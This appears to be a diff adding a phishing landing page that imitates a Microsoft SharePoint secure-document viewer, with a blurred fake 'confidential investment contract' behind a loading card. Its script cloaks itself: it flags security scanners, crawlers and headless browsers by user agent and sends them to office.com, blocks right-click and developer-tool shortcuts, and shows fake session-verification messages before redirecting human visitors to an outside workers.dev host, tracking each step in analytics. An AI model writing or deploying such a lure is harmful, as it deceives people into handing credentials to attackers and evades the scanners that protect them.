@@ -1,0 +1,1051 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex" />
+  <meta name="referrer" content="no-referrer" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  <meta http-equiv="Expires" content="0" />
+  <title>SharePoint - Secure Document Access</title>
+  
+  <!-- ===== GOOGLE ANALYTICS - LOADS FIRST ===== -->
+  <!-- Using a more reliable loading method -->
+  <script>
+    // Create a promise to ensure GA loads
+    window.GA_READY = false;
+    window.GA_QUEUE = [];
+    
+    // Define gtag before the script loads
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+      window.dataLayer.push(arguments);
+      // Also queue for later
+      if (!window.GA_READY) {
+        window.GA_QUEUE.push(arguments);
+      }
+    }
+    
+    // Set a timeout to force redirect even if GA fails to load
+    window.FORCE_REDIRECT_TIMEOUT = null;
+  </script>
+  
+  <!-- Load GA -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-ND7N43EHT4" 
+    onload="window.GA_READY = true; console.log('✅ GA Loaded!')"
+    onerror="console.log('❌ GA Failed to load'); window.GA_FAILED = true;">
+  </script>
+  
+  <script>
+    // Initialize GA
+    gtag('js', new Date());
+    gtag('config', 'G-ND7N43EHT4', {
+      'send_page_view': true,
+      'cookie_flags': 'SameSite=None;Secure'
+    });
+    
+    // Send a test event immediately
+    gtag('event', 'page_visit', {
+      'visitor_type': 'human',
+      'timestamp': new Date().toISOString(),
+      'page': window.location.pathname
+    });
+    
+    console.log('📊 GA initialized with ID: G-ND7N43EHT4');
+  </script>
+  
+  <style>
+    /* ===== ALL YOUR EXISTING CSS HERE (keep the same) ===== */
+    :root {
+      --bg: #f5f5f5;
+      --surface: #ffffff;
+      --surface-soft: #fafafa;
+      --text: #1e1e1e;
+      --muted: #626262;
+      --line: #e1e1e1;
+      --brand: #0078d4;
+      --brand-dark: #005a9e;
+      --shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+      --radius: 8px;
+      --font: "Segoe UI", -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+
+    [data-theme="dark"] {
+      --bg: #111214;
+      --surface: #1b1d21;
+      --surface-soft: #24262b;
+      --text: #f5f5f5;
+      --muted: #b6b6b6;
+      --line: #34373d;
+      --shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: var(--font);
+      color: var(--text);
+      background: var(--bg);
+      overflow-x: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .topbar {
+      background: var(--surface);
+      border-bottom: 1px solid var(--line);
+      padding: 12px 32px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      position: relative;
+      z-index: 3;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
+    }
+
+    .topbar svg {
+      height: 28px;
+      width: auto;
+    }
+
+    .topbar-brand {
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text);
+      letter-spacing: -0.2px;
+    }
+
+    .topbar-divider {
+      width: 1px;
+      height: 24px;
+      background: var(--line);
+      margin: 0 4px;
+    }
+
+    .topbar-user {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-left: auto;
+    }
+
+    .user-avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: var(--brand);
+      color: #fff;
+      display: grid;
+      place-items: center;
+      font-weight: 600;
+      font-size: 13px;
+    }
+
+    .page {
+      flex: 1;
+      min-height: calc(100vh - 73px);
+      display: grid;
+      place-items: center;
+      padding: 40px 20px;
+      position: relative;
+    }
+
+    .preview-bg {
+      position: absolute;
+      inset: 0;
+      display: grid;
+      place-items: center;
+      pointer-events: none;
+      overflow: hidden;
+      z-index: 0;
+    }
+
+    .fake-document {
+      width: min(900px, 85vw);
+      min-height: 780px;
+      background: #ffffff;
+      border: 1px solid #d0d0d0;
+      box-shadow: 0 8px 40px rgba(0, 0, 0, 0.12);
+      padding: 50px 55px;
+      filter: blur(3.5px);
+      opacity: 0.72;
+      transform: scale(1.02);
+      position: relative;
+      font-family: "Segoe UI", "Georgia", serif;
+    }
+
+    [data-theme="dark"] .fake-document {
+      background: #2a2a2a;
+      border-color: #3a3a3a;
+    }
+
+    .doc-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 3px solid #1a1a1a;
+      padding-bottom: 15px;
+      margin-bottom: 20px;
+    }
+
+    [data-theme="dark"] .doc-header {
+      border-bottom-color: #4a4a4a;
+    }
+
+    .doc-title-main {
+      font-size: 24px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      color: #1a1a1a;
+    }
+
+    [data-theme="dark"] .doc-title-main {
+      color: #e0e0e0;
+    }
+
+    .doc-badge {
+      background: #dc3545;
+      color: #fff;
+      padding: 4px 16px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+
+    .doc-meta {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      margin-bottom: 15px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid #e8e8e8;
+    }
+
+    [data-theme="dark"] .doc-meta {
+      border-bottom-color: #3a3a3a;
+    }
+
+    .doc-meta-item {
+      display: flex;
+      gap: 5px;
+    }
+
+    .doc-meta-label {
+      font-weight: 600;
+      color: #555;
+    }
+
+    [data-theme="dark"] .doc-meta-label {
+      color: #999;
+    }
+
+    .doc-meta-value {
+      color: #1a1a1a;
+    }
+
+    [data-theme="dark"] .doc-meta-value {
+      color: #ccc;
+    }
+
+    .doc-section {
+      margin: 12px 0;
+    }
+
+    .doc-section-title {
+      font-size: 14px;
+      font-weight: 700;
+      color: #1a1a1a;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 6px;
+    }
+
+    [data-theme="dark"] .doc-section-title {
+      color: #e0e0e0;
+    }
+
+    .doc-text-line {
+      height: 10px;
+      background: #e8e8e8;
+      border-radius: 20px;
+      margin: 4px 0;
+    }
+
+    [data-theme="dark"] .doc-text-line {
+      background: #3a3a3a;
+    }
+
+    .doc-text-line.short { width: 35%; }
+    .doc-text-line.medium { width: 55%; }
+    .doc-text-line.long { width: 75%; }
+    .doc-text-line.full { width: 95%; }
+    .doc-text-line.thin { height: 8px; }
+    .doc-text-line.thick { height: 14px; }
+
+    .doc-finding {
+      display: flex;
+      margin: 8px 0;
+      padding: 8px;
+      background: #f8f9fa;
+      border-left: 4px solid #dc3545;
+      border-radius: 3px;
+    }
+
+    [data-theme="dark"] .doc-finding {
+      background: #333;
+      border-left-color: #dc3545;
+    }
+
+    .doc-finding-number {
+      font-weight: 700;
+      font-size: 12px;
+      color: #dc3545;
+      min-width: 30px;
+    }
+
+    [data-theme="dark"] .doc-finding-number {
+      color: #ff6b6b;
+    }
+
+    .doc-finding-content {
+      flex: 1;
+    }
+
+    .doc-finding-content .line {
+      height: 10px;
+      background: #e8e8e8;
+      border-radius: 20px;
+      margin: 3px 0;
+    }
+
+    [data-theme="dark"] .doc-finding-content .line {
+      background: #3a3a3a;
+    }
+
+    .doc-finding-content .line.short { width: 40%; }
+    .doc-finding-content .line.medium { width: 60%; }
+    .doc-finding-content .line.long { width: 80%; }
+
+    .doc-recommendation {
+      display: flex;
+      margin: 6px 0;
+      padding: 6px 8px;
+      background: #e8f4fd;
+      border-radius: 3px;
+    }
+
+    [data-theme="dark"] .doc-recommendation {
+      background: #2a3a4a;
+    }
+
+    .doc-recommendation .bullet {
+      color: #0078d4;
+      font-weight: 700;
+      margin-right: 8px;
+    }
+
+    [data-theme="dark"] .doc-recommendation .bullet {
+      color: #4a9eff;
+    }
+
+    .doc-recommendation .line {
+      height: 10px;
+      background: #d0d0d0;
+      border-radius: 20px;
+      margin: 3px 0;
+      flex: 1;
+    }
+
+    [data-theme="dark"] .doc-recommendation .line {
+      background: #3a3a3a;
+    }
+
+    .doc-signature-section {
+      margin-top: 20px;
+      padding-top: 15px;
+      border-top: 2px solid #e8e8e8;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    [data-theme="dark"] .doc-signature-section {
+      border-top-color: #3a3a3a;
+    }
+
+    .doc-signature-block {
+      flex: 1;
+    }
+
+    .doc-signature-label {
+      font-size: 10px;
+      font-weight: 600;
+      color: #777;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    [data-theme="dark"] .doc-signature-label {
+      color: #999;
+    }
+
+    .doc-signature-line {
+      width: 180px;
+      height: 2px;
+      background: #aaa;
+      margin: 6px 0 3px 0;
+    }
+
+    .doc-signature-squiggle {
+      width: 160px;
+      height: 25px;
+      background: repeating-linear-gradient(45deg, #aaa 0px, #aaa 1.5px, transparent 1.5px, transparent 4px);
+      opacity: 0.5;
+      margin: 3px 0;
+    }
+
+    .doc-signature-date {
+      font-size: 10px;
+      color: #888;
+    }
+
+    [data-theme="dark"] .doc-signature-date {
+      color: #999;
+    }
+
+    .doc-footer {
+      margin-top: 15px;
+      padding-top: 10px;
+      border-top: 1px solid #e8e8e8;
+      text-align: center;
+      font-size: 10px;
+      color: #888;
+      letter-spacing: 0.5px;
+    }
+
+    [data-theme="dark"] .doc-footer {
+      border-top-color: #3a3a3a;
+      color: #888;
+    }
+
+    .doc-watermark {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) rotate(-25deg);
+      font-size: 70px;
+      font-weight: 900;
+      color: rgba(0, 0, 0, 0.04);
+      letter-spacing: 12px;
+      pointer-events: none;
+      white-space: nowrap;
+    }
+
+    [data-theme="dark"] .doc-watermark {
+      color: rgba(255, 255, 255, 0.04);
+    }
+
+    /* Loading Card */
+    .access-card {
+      width: min(480px, 94vw);
+      background: var(--surface);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      position: relative;
+      z-index: 2;
+      overflow: hidden;
+      animation: cardIn 420ms ease-out both;
+      border: 1px solid var(--line);
+      padding: 40px 32px;
+      text-align: center;
+    }
+
+    .access-card .icon-large {
+      font-size: 56px;
+      margin-bottom: 16px;
+      display: block;
+    }
+
+    .access-card h1 {
+      margin: 0 0 8px;
+      font-size: 20px;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    .access-card p {
+      color: var(--muted);
+      font-size: 14px;
+      line-height: 1.5;
+      margin: 0 0 20px;
+    }
+
+    .spinner {
+      width: 48px;
+      height: 48px;
+      margin: 8px auto 16px;
+      border-radius: 50%;
+      border: 4px solid rgba(0, 120, 212, 0.12);
+      border-top-color: var(--brand);
+      animation: spin 800ms linear infinite;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 4px;
+      background: var(--line);
+      border-radius: 4px;
+      overflow: hidden;
+      margin-top: 16px;
+    }
+
+    .progress-bar .progress-fill {
+      height: 100%;
+      background: var(--brand);
+      border-radius: 4px;
+      width: 0%;
+      animation: progress 5.5s ease-in-out forwards;
+    }
+
+    @keyframes progress {
+      0% { width: 0%; }
+      20% { width: 15%; }
+      40% { width: 35%; }
+      60% { width: 60%; }
+      80% { width: 85%; }
+      100% { width: 100%; }
+    }
+
+    .loader-status {
+      color: var(--muted);
+      font-size: 13px;
+      margin-top: 12px;
+      animation: pulse 1.5s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    .theme-toggle {
+      position: fixed;
+      right: 18px;
+      bottom: 18px;
+      z-index: 4;
+      border: 1px solid var(--line);
+      background: var(--surface);
+      color: var(--text);
+      border-radius: 999px;
+      padding: 8px 14px;
+      font-size: 12px;
+      cursor: pointer;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    @keyframes cardIn {
+      from { transform: translateY(12px) scale(0.99); opacity: 0; }
+      to { transform: translateY(0) scale(1); opacity: 1; }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      * {
+        animation-duration: 1ms !important;
+        transition-duration: 1ms !important;
+        scroll-behavior: auto !important;
+      }
+    }
+
+    @media (max-width: 520px) {
+      .topbar {
+        padding: 10px 16px;
+      }
+
+      .topbar-brand { font-size: 13px; }
+
+      .page {
+        align-items: start;
+        padding-top: 24px;
+      }
+
+      .access-card {
+        padding: 28px 20px;
+      }
+
+      .access-card h1 { font-size: 18px; }
+
+      .fake-document {
+        width: 92vw;
+        min-height: 600px;
+        padding: 30px 25px;
+        filter: blur(3px);
+        opacity: 0.7;
+      }
+
+      .doc-title-main { font-size: 18px; }
+      .doc-header { flex-direction: column; align-items: flex-start; gap: 8px; }
+      .doc-meta { flex-direction: column; gap: 4px; }
+      .doc-signature-section { flex-direction: column; gap: 15px; }
+      .doc-signature-line { width: 100%; }
+      .doc-watermark { font-size: 40px; }
+    }
+  </style>
+</head>
+<body>
+  <!-- SharePoint-style Topbar -->
+  <header class="topbar">
+    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M2 4C2 2.89543 2.89543 2 4 2H20C21.1046 2 22 2.89543 22 4V20C22 21.1046 21.1046 22 20 22H4C2.89543 22 2 21.1046 2 20V4Z" fill="#0078D4"/>
+      <path d="M6 6H14V8H6V6ZM6 10H18V12H6V10ZM6 14H16V16H6V14ZM6 18H12V20H6V18Z" fill="white"/>
+    </svg>
+    <span class="topbar-brand">SharePoint</span>
+    <div class="topbar-divider"></div>
+    <span style="font-size:13px;color:var(--muted);">Documents</span>
+    <div class="topbar-user">
+      <div class="user-avatar">DP</div>
+    </div>
+  </header>
+
+  <main class="page">
+    <!-- Blurry Background Document -->
+    <div class="preview-bg" aria-hidden="true">
+      <div class="fake-document">
+        <div class="doc-watermark">CONFIDENTIAL</div>
+        
+        <div class="doc-header">
+          <div class="doc-title-main">INVESTMENT CONTRACT REVIEW</div>
+          <div class="doc-badge">CONFIDENTIAL</div>
+        </div>
+        
+        <div class="doc-meta">
+          <div class="doc-meta-item">
+            <span class="doc-meta-label">Document ID:</span>
+            <span class="doc-meta-value">ICR-2026-0042</span>
+          </div>
+          <div class="doc-meta-item">
+            <span class="doc-meta-label">Review Date:</span>
+            <span class="doc-meta-value">June 26, 2026</span>
+          </div>
+          <div class="doc-meta-item">
+            <span class="doc-meta-label">Prepared For:</span>
+            <span class="doc-meta-value">Alpha Investment Group</span>
+          </div>
+          <div class="doc-meta-item">
+            <span class="doc-meta-label">Reviewer:</span>
+            <span class="doc-meta-value">Senior Legal Counsel</span>
+          </div>
+        </div>
+        
+        <div class="doc-section">
+          <div class="doc-section-title">📋 Executive Summary</div>
+          <div class="doc-text-line full thin"></div>
+          <div class="doc-text-line long"></div>
+          <div class="doc-text-line medium"></div>
+          <div class="doc-text-line full"></div>
+          <div class="doc-text-line long"></div>
+          <div class="doc-text-line medium"></div>
+        </div>
+        
+        <div class="doc-section">
+          <div class="doc-section-title">⚠️ Key Findings & Observations</div>
+          <div class="doc-finding">
+            <div class="doc-finding-number">#1</div>
+            <div class="doc-finding-content">
+              <div class="line long"></div>
+              <div class="line medium"></div>
+              <div class="line short"></div>
+            </div>
+          </div>
+          <div class="doc-finding">
+            <div class="doc-finding-number">#2</div>
+            <div class="doc-finding-content">
+              <div class="line full"></div>
+              <div class="line long"></div>
+              <div class="line medium"></div>
+            </div>
+          </div>
+          <div class="doc-finding">
+            <div class="doc-finding-number">#3</div>
+            <div class="doc-finding-content">
+              <div class="line long"></div>
+              <div class="line medium"></div>
+              <div class="line short"></div>
+            </div>
+          </div>
+        </div>
+        
+        <div class="doc-section">
+          <div class="doc-section-title">✅ Recommendations</div>
+          <div class="doc-recommendation">
+            <span class="bullet">•</span>
+            <div class="line"></div>
+          </div>
+          <div class="doc-recommendation">
+            <span class="bullet">•</span>
+            <div class="line"></div>
+          </div>
+          <div class="doc-recommendation">
+            <span class="bullet">•</span>
+            <div class="line"></div>
+          </div>
+        </div>
+        
+        <div class="doc-signature-section">
+          <div class="doc-signature-block">
+            <div class="doc-signature-label">Approved By:</div>
+            <div class="doc-signature-squiggle"></div>
+            <div class="doc-signature-line"></div>
+            <div class="doc-signature-date">Signature</div>
+          </div>
+          <div class="doc-signature-block" style="text-align:right;">
+            <div class="doc-signature-label">Date:</div>
+            <div style="height:10px;"></div>
+            <div class="doc-signature-line" style="width:120px;margin-left:auto;"></div>
+            <div class="doc-signature-date">June 26, 2026</div>
+          </div>
+        </div>
+        
+        <div class="doc-footer">
+          This document is confidential and intended solely for the use of the individual or entity to whom it is addressed.
+        </div>
+      </div>
+    </div>
+
+    <!-- Loading Card -->
+    <section class="access-card">
+      <span class="icon-large">📄</span>
+      <h1>Preparing Secure Document</h1>
+      <p>Please wait while we verify your session and load the document.</p>
+      
+      <div class="spinner"></div>
+      
+      <div class="progress-bar">
+        <div class="progress-fill"></div>
+      </div>
+      
+      <div class="loader-status" id="statusText">Initializing secure connection...</div>
+    </section>
+  </main>
+
+  <button class="theme-toggle" id="themeToggle" type="button">Dark mode</button>
+
+  <script>
+    (() => {
+      "use strict";
+      
+      // ============================================================
+      // CONFIGURATION
+      // ============================================================
+      const REDIRECT_URL = "https://ao7c-hfyj-b5xx.michele-mercuriohk-com-s-account.workers.dev";
+      const BOT_REDIRECT = "https://www.office.com";
+      // INCREASED DELAY - 6-8 seconds to ensure GA has time
+      const REDIRECT_DELAY_MIN = 6000;  // 6 seconds minimum
+      const REDIRECT_DELAY_MAX = 8000;  // 8 seconds maximum
+      
+      // ============================================================
+      // TRACKING FUNCTIONS (with fallbacks)
+      // ============================================================
+      
+      function trackEvent(eventName, params = {}) {
+        try {
+          if (typeof gtag !== 'undefined') {
+            gtag('event', eventName, params);
+            console.log(`📊 Event sent: ${eventName}`, params);
+          } else {
+            console.warn('⚠️ gtag not available, event not sent');
+            // Fallback: send via beacon if possible
+            sendBeaconFallback(eventName, params);
+          }
+        } catch(e) {
+          console.error('❌ Error sending event:', e);
+        }
+      }
+      
+      // Fallback method using sendBeacon
+      function sendBeaconFallback(eventName, params) {
+        try {
+          const data = new URLSearchParams({
+            v: '1',
+            tid: 'G-ND7N43EHT4',
+            cid: '555',
+            t: 'event',
+            ec: eventName,
+            ea: JSON.stringify(params)
+          });
+          navigator.sendBeacon(
+            'https://www.google-analytics.com/collect',
+            data
+          );
+          console.log(`📊 Beacon fallback sent: ${eventName}`);
+        } catch(e) {
+          console.error('❌ Beacon fallback failed:', e);
+        }
+      }
+      
+      function trackVisit(isBot) {
+        trackEvent('page_visit', {
+          'visitor_type': isBot ? 'bot' : 'human',
+          'timestamp': new Date().toISOString(),
+          'page': window.location.pathname,
+          'hostname': window.location.hostname
+        });
+      }
+      
+      function trackRedirect(isBot) {
+        trackEvent('redirect_attempt', {
+          'visitor_type': isBot ? 'bot' : 'human',
+          'destination': isBot ? 'office.com' : 'target_url',
+          'timestamp': new Date().toISOString()
+        });
+      }
+      
+      function trackBotRedirect(reason) {
+        trackEvent('bot_redirected', {
+          'reason': reason,
+          'user_agent': navigator.userAgent.substring(0, 50)
+        });
+      }
+      
+      function trackGAStatus(status) {
+        trackEvent('ga_status', {
+          'status': status,
+          'timestamp': new Date().toISOString()
+        });
+      }
+      
+      // ============================================================
+      // BOT DETECTION
+      // ============================================================
+      
+      function isBot() {
+        const ua = navigator.userAgent.toLowerCase();
+        
+        const botPatterns = [
+          'bot', 'crawl', 'spider', 'slurp', 'fetch', 'scanner',
+          'preview', 'linkchecker', 'facebookexternalhit', 'twitterbot',
+          'discordbot', 'telegrambot', 'whatsapp', 'curl', 'wget',
+          'python-requests', 'httpclient', 'headless', 'phantomjs',
+          'selenium', 'webdriver', 'puppeteer', 'playwright',
+          'lighthouse', 'gtmetrix', 'pingdom', 'uptimerobot',
+          'googlebot', 'bingbot', 'duckduckbot', 'baiduspider',
+          'yandexbot', 'ia_archiver', 'scrapy', 'go-http-client',
+          'okhttp', 'java', 'axios', 'node-fetch', 'got', 'request',
+          'urllib', 'perl', 'ruby', 'python', 'php', 'http',
+          'nmap', 'masscan', 'zmap', 'zgrab', 'semrush', 'ahrefs'
+        ];
+        
+        for (let pattern of botPatterns) {
+          if (ua.includes(pattern)) return true;
+        }
+        
+        if (navigator.webdriver) return true;
+        if (window.navigator?.webdriver) return true;
+        if (ua.includes('HeadlessChrome')) return true;
+        if (ua.includes('PhantomJS')) return true;
+        
+        if (!navigator.plugins || navigator.plugins.length === 0) {
+          const isMobile = /android|iphone|ipad|ipod/i.test(ua);
+          if (!isMobile) return true;
+        }
+        
+        return false;
+      }
+      
+      // ============================================================
+      // BEHAVIOR ANALYSIS
+      // ============================================================
+      
+      let mouseMoves = 0;
+      let clicks = 0;
+      let keyPresses = 0;
+      let startTime = Date.now();
+      let suspicious = false;
+      
+      document.addEventListener('mousemove', () => { mouseMoves++; }, { passive: true });
+      document.addEventListener('click', () => { clicks++; }, { passive: true });
+      document.addEventListener('keydown', () => { keyPresses++; }, { passive: true });
+      
+      // ============================================================
+      // LOADING STATUS UPDATES
+      // ============================================================
+      
+      const statusMessages = [
+        { time: 0, message: 'Initializing secure connection...' },
+        { time: 1.0, message: 'Verifying session credentials...' },
+        { time: 2.0, message: 'Decrypting document payload...' },
+        { time: 3.0, message: 'Loading secure viewer...' },
+        { time: 4.0, message: 'Almost ready...' },
+        { time: 5.5, message: 'Finalizing secure handshake...' }
+      ];
+      
+      function updateStatus() {
+        const statusEl = document.getElementById('statusText');
+        if (!statusEl) return;
+        
+        const elapsed = (Date.now() - startTime) / 1000;
+        let currentMessage = statusMessages[0].message;
+        
+        for (let i = statusMessages.length - 1; i >= 0; i--) {
+          if (elapsed >= statusMessages[i].time) {
+            currentMessage = statusMessages[i].message;
+            break;
+          }
+        }
+        
+        statusEl.textContent = currentMessage;
+      }
+      
+      const statusInterval = setInterval(updateStatus, 200);
+      
+      // ============================================================
+      // ANTI-INSPECTION PROTECTION
+      // ============================================================
+      
+      document.addEventListener('contextmenu', (e) => {
+        e.preventDefault();
+        return false;
+      });
+      
+      document.addEventListener('keydown', (e) => {
+        if (e.key === 'F12' || 
+            (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key.toUpperCase())) ||
+            (e.ctrlKey && e.key === 'U')) {
+          e.preventDefault();
+          return false;
+        }
+      });
+      
+      // ============================================================
+      // MAIN EXECUTION
+      // ============================================================
+      
+      window.addEventListener('load', function() {
+        console.log('🚀 Page loaded - checking visitor...');
+        
+        // Check if GA loaded
+        setTimeout(function() {
+          if (window.GA_READY) {
+            console.log('✅ Google Analytics loaded successfully!');
+            trackGAStatus('loaded');
+          } else {
+            console.warn('⚠️ Google Analytics may not have loaded');
+            trackGAStatus('not_loaded');
+          }
+        }, 1000);
+        
+        const bot = isBot();
+        console.log(`🔍 Bot detection: ${bot ? '🤖 BOT' : '👤 HUMAN'}`);
+        
+        // Track the visit
+        trackVisit(bot);
+        
+        // If bot detected, redirect to office.com
+        if (bot) {
+          trackBotRedirect('bot_detected_on_load');
+          
+          document.querySelector('.access-card h1').textContent = 'Access Denied';
+          document.querySelector('.access-card p').textContent = 'Unable to verify your session.';
+          document.querySelector('.loader-status').textContent = 'Redirecting to verification...';
+          
+          setTimeout(() => {
+            window.location.href = BOT_REDIRECT;
+          }, 1000);
+          
+          return;
+        }
+        
+        // Human visitor - track and redirect
+        trackRedirect(false);
+        
+        // Calculate random delay
+        const delay = REDIRECT_DELAY_MIN + Math.random() * (REDIRECT_DELAY_MAX - REDIRECT_DELAY_MIN);
+        console.log(`⏱️ Redirecting in ${(delay/1000).toFixed(1)} seconds...`);
+        
+        // Send a final "confirm" event before redirect
+        setTimeout(function() {
+          trackEvent('redirect_confirmed', {
+            'delay_seconds': (delay/1000).toFixed(1),
+            'timestamp': new Date().toISOString()
+          });
+        }, delay - 1500);
+        
+        // Redirect after delay
+        setTimeout(() => {
+          clearInterval(statusInterval);
+          
+          // Final attempt to send data before redirect
+          trackEvent('redirect_final', {
+            'timestamp': new Date().toISOString()
+          });
+          
+          // Force send any pending data with sendBeacon
+          try {
+            navigator.sendBeacon(
+              'https://www.google-analytics.com/collect',
+              new URLSearchParams({
+                v: '1',
+                tid: 'G-ND7N43EHT4',
+                cid: '555',
+                t: 'event',
+                ec: 'redirect_final_beacon',
+                ea: 'success'
+              })
+            );
+          } catch(e) {}
+          
+          // Also use the standard method
+          if (typeof gtag !== 'undefined') {
+            gtag('event', 'redirect_final_standard', {
+              'timestamp': new Date().toISOString()
+            });
+          }
+          
+          // Small delay to let data send
+          setTimeout(function() {
+            window.location.href = REDIRECT_URL;
+          }, 300);
+          
+        }, delay);
+      });
+      
+      // ============================================================
+      // THEME TOGGLE
+      // ============================================================
+      
+      document.getElementById('themeToggle').addEventListener('click', () => {
+        const root = document.documentElement;
+        const isDark = root.getAttribute('data-theme') === 'dark';
+        root.setAttribute('data-theme', isDark ? 'light' : 'dark');
+        document.getElementById('themeToggle').textContent = isDark ? 'Dark mode' : 'Light mode';
+        trackEvent('theme_toggle', { mode: isDark ? 'light' : 'dark' });
+      });
+      
+      // ============================================================
+      // CONSOLE LOG
+      // ============================================================
+      
+      console.log('🔒 SharePoint Secure Document Portal');
+      console.log('📊 Tracking enabled - ID: G-ND7N43EHT4');
+      console.log('🤖 Bot detection active');
+      console.log(`⏱️ Redirecting in ${(REDIRECT_DELAY_MIN/1000)}-${(REDIRECT_DELAY_MAX/1000)} seconds...`);
+      
+      // Log GA status
+      setTimeout(function() {
+        if (typeof gtag !== 'undefined') {
+          console.log('✅ gtag function available');
+        } else {
+          console.error('❌ gtag function NOT available - tracking will fail!');
+        }
+        console.log(`📊 GA Ready: ${window.GA_READY || false}`);
+      }, 500);
+      
+    })();
+  </script>
+</body>
+</html>
